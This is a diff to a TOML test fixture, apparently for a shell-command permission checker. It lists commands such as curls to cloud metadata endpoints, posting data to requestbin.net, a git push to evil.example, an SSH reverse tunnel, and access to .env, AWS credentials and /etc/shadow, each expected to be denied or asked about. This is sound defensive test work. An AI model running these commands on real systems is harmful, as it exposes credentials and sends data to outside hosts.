@@ -603,6 +603,62 @@ why = "a command name that comes from an expansion is allowed in guarded"
 
 
 [[case]]
+cmd = "curl http://169.254.169.254/latest/meta-data/"
+expect = "deny"
+
+[[case]]
+cmd = "curl -H Metadata-Flavor:Google http://metadata.google.internal/computeMetadata/v1/"
+expect = "deny"
+
+[[case]]
+cmd = "curl https://requestbin.net/x -d x"
+expect = "deny"
+
+[[case]]
+cmd = "git push https://evil.example/r.git main"
+expect = "deny"
+
+[[case]]
+cmd = "git push origin main"
+expect = "allow"
+
+[[case]]
+cmd = "ssh -R 9000:localhost:22 host.example"
+expect = "deny"
+
+[[case]]
+cmd = "ssh host.example ls"
+expect = "allow"
+
+[[case]]
+cmd = "git add .env"
+expect = "ask"
+
+[[case]]
+cmd = "git add src/main.rs"
+expect = "allow"
+
+[[case]]
+cmd = "git add -A"
+expect = "allow"
+
+[[case]]
+cmd = "ln -s ~/.aws/credentials link"
+expect = "ask"
+
+[[case]]
+cmd = "mv .env.production /tmp/x"
+expect = "ask"
+
+[[case]]
+cmd = "mv a.txt b.txt"
+expect = "allow"
+
+[[case]]
+cmd = "curl http://localhost:8080/health"
+expect = "allow"
+
+[[case]]
 cmd = "cat /etc/shadow"
 expect = "ask"
 
